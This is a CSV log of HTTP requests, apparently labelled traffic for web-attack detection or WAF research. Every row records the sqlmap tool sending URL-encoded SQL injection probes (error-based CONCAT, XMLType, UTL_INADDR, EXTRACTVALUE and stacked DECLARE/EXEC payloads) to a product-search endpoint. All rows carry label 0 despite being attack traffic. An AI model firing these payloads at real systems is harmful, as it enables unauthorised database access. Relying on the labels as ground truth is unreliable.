@timestamp,auth_token_hash,method,path,path_normalized,remote_ip,request_id,response_size,response_time_ms,sampling_flag,status,upstream,user_agent,user_id_hash,user_role,waf_action,waf_rule_id,label
2026-05-04 07:16:53+00:00,(empty),GET,/api/products?q=a%22%20AND%204486%3DCONCAT%28CHAR%28113%29%2BCHAR%28122%29%2BCHAR%28113%29%2BCHAR%28118%29%2BCHAR%28113%29%2C%28SELECT%20%28CASE%20WHEN%20%284486%3D4486%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2CCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28120%29%2BCHAR%28120%29%2BCHAR%28113%29%29%20AND%20%22hNvN%22%3D%22hNvN,/api/products,172.20.0.10,36b831fc0cddbca11aea2a65f6fa209f,0.0,3.0,0,307,172.20.0.16:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-04 07:16:53+00:00,(empty),GET,/api/products?q=a%29%20AND%204486%3DCONCAT%28CHAR%28113%29%2BCHAR%28122%29%2BCHAR%28113%29%2BCHAR%28118%29%2BCHAR%28113%29%2C%28SELECT%20%28CASE%20WHEN%20%284486%3D4486%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2CCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28120%29%2BCHAR%28120%29%2BCHAR%28113%29%29%20AND%20%285102%3D5102,/api/products,172.20.0.10,626e86f62c27382ceaaada6258d8d06e,0.0,3.0,0,307,172.20.0.16:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-04 07:16:53+00:00,(empty),GET,/api/products?q=a%29%29%20AND%204486%3DCONCAT%28CHAR%28113%29%2BCHAR%28122%29%2BCHAR%28113%29%2BCHAR%28118%29%2BCHAR%28113%29%2C%28SELECT%20%28CASE%20WHEN%20%284486%3D4486%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2CCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28120%29%2BCHAR%28120%29%2BCHAR%28113%29%29%20AND%20%28%281383%3D1383,/api/products,172.20.0.10,c106956c8d66271177b80b82be11ea9d,0.0,3.0,0,307,172.20.0.16:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-04 07:16:53+00:00,(empty),GET,/api/products?q=a%20AND%204486%3DCONCAT%28CHAR%28113%29%2BCHAR%28122%29%2BCHAR%28113%29%2BCHAR%28118%29%2BCHAR%28113%29%2C%28SELECT%20%28CASE%20WHEN%20%284486%3D4486%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2CCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28120%29%2BCHAR%28120%29%2BCHAR%28113%29%29,/api/products,172.20.0.10,657b49350a8f598c5c131666389c47c2,0.0,3.0,0,307,172.20.0.16:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-04 07:16:53+00:00,(empty),GET,/api/products?q=a%20AND%204486%3DCONCAT%28CHAR%28113%29%2BCHAR%28122%29%2BCHAR%28113%29%2BCHAR%28118%29%2BCHAR%28113%29%2C%28SELECT%20%28CASE%20WHEN%20%284486%3D4486%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2CCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28120%29%2BCHAR%28120%29%2BCHAR%28113%29%29--%20XcEX,/api/products,172.20.0.10,0926f1858801b850c01cb5c8005de04f,0.0,2.0,0,307,172.20.0.16:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-04 07:16:53+00:00,(empty),GET,/api/products?q=a%27%29%20AND%204943%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%284943%3D4943%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%28%27IvBu%27%3D%27IvBu,/api/products,172.20.0.10,634c9452332410d16e5a2470874e3d5d,0.0,4.0,0,307,172.20.0.16:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-04 07:16:53+00:00,(empty),GET,/api/products?q=a%27%29%29%20AND%204943%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%284943%3D4943%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%28%28%27XlZJ%27%3D%27XlZJ,/api/products,172.20.0.10,a32faf03de56cc5aa8654d11f42802fe,0.0,4.0,0,307,172.20.0.16:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-04 07:16:53+00:00,(empty),GET,/api/products?q=a%27%20AND%204943%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%284943%3D4943%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%27CVva%27%3D%27CVva,/api/products,172.20.0.10,f5a356b351c6ff949ef84c48344f3001,0.0,3.0,0,307,172.20.0.16:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-04 07:16:53+00:00,(empty),GET,/api/products?q=a%27%29%20AND%204943%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%284943%3D4943%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%28%27Vmnb%27%20LIKE%20%27Vmnb,/api/products,172.20.0.10,3fa523844a6e9303f0e43fbc44f3071f,0.0,3.0,0,307,172.20.0.16:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-04 07:16:53+00:00,(empty),GET,/api/products?q=a%25%27%20AND%204943%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%284943%3D4943%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%27wdsa%25%27%3D%27wdsa,/api/products,172.20.0.10,0371125322680a452e36cca97bc76d50,0.0,3.0,0,307,172.20.0.16:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-04 07:16:53+00:00,(empty),GET,/api/products?q=a%27%20AND%204943%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%284943%3D4943%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%27bcDS%27%20LIKE%20%27bcDS,/api/products,172.20.0.10,edfcb94c3699cb00e627ba07e8347e78,0.0,2.0,0,307,172.20.0.16:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-04 07:16:53+00:00,(empty),GET,/api/products?q=a%22%29%20AND%204943%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%284943%3D4943%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%28%22gZSH%22%3D%22gZSH,/api/products,172.20.0.10,cc4424ef1b8c025fc8b3598c5f3b4011,0.0,3.0,0,307,172.20.0.16:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-04 07:16:53+00:00,(empty),GET,/api/products?q=a%22%20AND%204943%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%284943%3D4943%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%22WDpj%22%3D%22WDpj,/api/products,172.20.0.10,a59bd5c8aded4689995d332b2525ee60,0.0,2.0,0,307,172.20.0.16:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-04 07:16:53+00:00,(empty),GET,/api/products?q=a%29%20AND%204943%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%284943%3D4943%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%284743%3D4743,/api/products,172.20.0.10,59cb9dd4481aaee36ce943dff1a3019e,0.0,5.0,0,307,172.20.0.16:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-04 07:16:53+00:00,(empty),GET,/api/products?q=a%29%29%20AND%204943%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%284943%3D4943%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%28%281083%3D1083,/api/products,172.20.0.10,869effdebbf0a09115792c199e200a76,0.0,3.0,0,307,172.20.0.16:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-04 07:16:53+00:00,(empty),GET,/api/products?q=a%20AND%204943%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%284943%3D4943%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29,/api/products,172.20.0.10,aae7e2259faf35bac4f2a662b0a29656,0.0,3.0,0,307,172.20.0.16:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-04 07:16:53+00:00,(empty),GET,/api/products?q=a%20AND%204943%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%284943%3D4943%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29--%20WiCp,/api/products,172.20.0.10,3df2438c01a120fa68477e794f11a37c,0.0,3.0,0,307,172.20.0.16:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-04 07:16:53+00:00,(empty),GET,/api/products?q=a%27%29%20AND%208759%3DUTL_INADDR.GET_HOST_ADDRESS%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%288759%3D8759%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%20AND%20%28%27AmJk%27%3D%27AmJk,/api/products,172.20.0.10,a80d34615d880af20f5c6b0b0f7fc816,0.0,2.0,0,307,172.20.0.16:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-04 07:16:53+00:00,(empty),GET,/api/products?q=a%27%29%29%20AND%208759%3DUTL_INADDR.GET_HOST_ADDRESS%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%288759%3D8759%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%20AND%20%28%28%27IDsg%27%3D%27IDsg,/api/products,172.20.0.10,bcbb7e15d55c8f286b80638a325f9514,0.0,3.0,0,307,172.20.0.16:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-04 07:16:53+00:00,(empty),GET,/api/products?q=a%27%20AND%208759%3DUTL_INADDR.GET_HOST_ADDRESS%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%288759%3D8759%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%20AND%20%27Idza%27%3D%27Idza,/api/products,172.20.0.10,39b20524a18270be074606cc4409a4fb,0.0,3.0,0,307,172.20.0.16:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-04 07:16:53+00:00,(empty),GET,/api/products?q=a%27%29%20AND%208759%3DUTL_INADDR.GET_HOST_ADDRESS%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%288759%3D8759%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%20AND%20%28%27IrUS%27%20LIKE%20%27IrUS,/api/products,172.20.0.10,409c51715c507f498fe261b0ec337931,0.0,3.0,0,307,172.20.0.16:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-04 07:16:53+00:00,(empty),GET,/api/products?q=a%25%27%20AND%208759%3DUTL_INADDR.GET_HOST_ADDRESS%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%288759%3D8759%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%20AND%20%27QapI%25%27%3D%27QapI,/api/products,172.20.0.10,d08b081e65aa9a3884cc943cff9c3a60,0.0,3.0,0,307,172.20.0.16:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-04 07:16:54+00:00,(empty),GET,/api/products?q=a%27%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%282118%2CCONCAT%280x5c%2C0x717a717671%2C%28SELECT%20%28CASE%20WHEN%20%282118%3D2118%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178787871%29%29%2C1%29%20AND%20%27AJsn%27%3D%27AJsn,/api/products,172.20.0.10,0d4c1206c47b5238334ef06af747577e,0.0,3.0,0,307,172.20.0.16:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-04 07:16:54+00:00,(empty),GET,/api/products?q=a%27%29%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%282118%2CCONCAT%280x5c%2C0x717a717671%2C%28SELECT%20%28CASE%20WHEN%20%282118%3D2118%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178787871%29%29%2C1%29%20AND%20%28%27YXvn%27%20LIKE%20%27YXvn,/api/products,172.20.0.10,b27a5fff4d8fdb7bb59534e6ed16e070,0.0,3.0,0,307,172.20.0.16:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-04 07:16:54+00:00,(empty),GET,/api/products?q=a%25%27%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%282118%2CCONCAT%280x5c%2C0x717a717671%2C%28SELECT%20%28CASE%20WHEN%20%282118%3D2118%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178787871%29%29%2C1%29%20AND%20%27GqXq%25%27%3D%27GqXq,/api/products,172.20.0.10,e546f2dc9e4ab31935e85ee0cdf7327a,0.0,2.0,0,307,172.20.0.16:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-04 07:16:54+00:00,(empty),GET,/api/products?q=a%27%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%282118%2CCONCAT%280x5c%2C0x717a717671%2C%28SELECT%20%28CASE%20WHEN%20%282118%3D2118%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178787871%29%29%2C1%29%20AND%20%27DzJa%27%20LIKE%20%27DzJa,/api/products,172.20.0.10,e24653b1c28e08090502599506335d96,0.0,2.0,0,307,172.20.0.16:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-04 07:16:54+00:00,(empty),GET,/api/products?q=a%22%29%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%282118%2CCONCAT%280x5c%2C0x717a717671%2C%28SELECT%20%28CASE%20WHEN%20%282118%3D2118%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178787871%29%29%2C1%29%20AND%20%28%22gvDO%22%3D%22gvDO,/api/products,172.20.0.10,9ed23c55afdc28de53c78cb9d940159c,0.0,3.0,0,307,172.20.0.16:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-04 07:16:54+00:00,(empty),GET,/api/products?q=a%22%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%282118%2CCONCAT%280x5c%2C0x717a717671%2C%28SELECT%20%28CASE%20WHEN%20%282118%3D2118%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178787871%29%29%2C1%29%20AND%20%22FvYn%22%3D%22FvYn,/api/products,172.20.0.10,4522d35844872dfd5935d6c79f4ec60a,0.0,5.0,0,307,172.20.0.16:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-04 07:16:54+00:00,(empty),GET,/api/products?q=a%29%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%282118%2CCONCAT%280x5c%2C0x717a717671%2C%28SELECT%20%28CASE%20WHEN%20%282118%3D2118%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178787871%29%29%2C1%29%20AND%20%281874%3D1874,/api/products,172.20.0.10,30d56454034ec6efa7288b9c5830782a,0.0,3.0,0,307,172.20.0.16:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-04 07:16:54+00:00,(empty),GET,/api/products?q=a%29%29%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%282118%2CCONCAT%280x5c%2C0x717a717671%2C%28SELECT%20%28CASE%20WHEN%20%282118%3D2118%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178787871%29%29%2C1%29%20AND%20%28%289002%3D9002,/api/products,172.20.0.10,66e07d07b995d82e1fcf3e353c8bb310,0.0,17.0,0,307,172.20.0.16:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-04 07:16:54+00:00,(empty),GET,/api/products?q=a%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%282118%2CCONCAT%280x5c%2C0x717a717671%2C%28SELECT%20%28CASE%20WHEN%20%282118%3D2118%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178787871%29%29%2C1%29,/api/products,172.20.0.10,5356b7eed839038df952aa4c1a50b858,0.0,3.0,0,307,172.20.0.16:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-04 07:16:54+00:00,(empty),GET,/api/products?q=a%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%282118%2CCONCAT%280x5c%2C0x717a717671%2C%28SELECT%20%28CASE%20WHEN%20%282118%3D2118%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178787871%29%29%2C1%29--%20LQIv,/api/products,172.20.0.10,7caa42f8b6624fb91d38aa466ccd6755,0.0,4.0,0,307,172.20.0.16:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-04 07:16:54+00:00,(empty),GET,/api/products?q=%28SELECT%201360%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x717a717671%2C%28SELECT%20%28ELT%281360%3D1360%2C1%29%29%29%2C0x7178787871%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29,/api/products,172.20.0.10,1f8b23786ba8696157b48b541c525890,0.0,3.0,0,307,172.20.0.16:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-04 07:16:54+00:00,(empty),GET,/api/products?q=%28EXTRACTVALUE%285834%2CCONCAT%280x5c%2C0x717a717671%2C%28SELECT%20%28ELT%285834%3D5834%2C1%29%29%29%2C0x7178787871%29%29%29,/api/products,172.20.0.10,981bae84979071c3d356eeba8b3d8919,0.0,3.0,0,307,172.20.0.16:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-04 07:16:54+00:00,(empty),GET,/api/products?q=%28CAST%28%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%288429%3D8429%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%29,/api/products,172.20.0.10,d6ab7b843ff20d56a45c2f5207fd618c,0.0,3.0,0,307,172.20.0.16:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-04 07:16:54+00:00,(empty),GET,/api/products?q=a%27%29%3BDECLARE%20%40ScWM%20NVARCHAR%284000%29%3BSET%20%40ScWM%3D%28SELECT%20%27qzqvq%27%2B%28SELECT%20%28CASE%20WHEN%20%285759%3D5759%29%20THEN%20%271%27%20ELSE%20%270%27%20END%29%29%2B%27qxxxq%27%29%3BEXEC%20%40ScWM--,/api/products,172.20.0.10,8f2daebe32e6c6ee5261143995730b43,0.0,2.0,0,307,172.20.0.16:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-04 07:16:54+00:00,(empty),GET,/api/products?q=a%27%29%29%3BDECLARE%20%40ScWM%20NVARCHAR%284000%29%3BSET%20%40ScWM%3D%28SELECT%20%27qzqvq%27%2B%28SELECT%20%28CASE%20WHEN%20%285759%3D5759%29%20THEN%20%271%27%20ELSE%20%270%27%20END%29%29%2B%27qxxxq%27%29%3BEXEC%20%40ScWM--,/api/products,172.20.0.10,a5d21eba951497b35bc8d500f61553a5,0.0,3.0,0,307,172.20.0.16:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-04 07:16:54+00:00,(empty),GET,/api/products?q=a%27%3BDECLARE%20%40ScWM%20NVARCHAR%284000%29%3BSET%20%40ScWM%3D%28SELECT%20%27qzqvq%27%2B%28SELECT%20%28CASE%20WHEN%20%285759%3D5759%29%20THEN%20%271%27%20ELSE%20%270%27%20END%29%29%2B%27qxxxq%27%29%3BEXEC%20%40ScWM--,/api/products,172.20.0.10,c78958467a6566042b953f272c712057,0.0,3.0,0,307,172.20.0.16:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
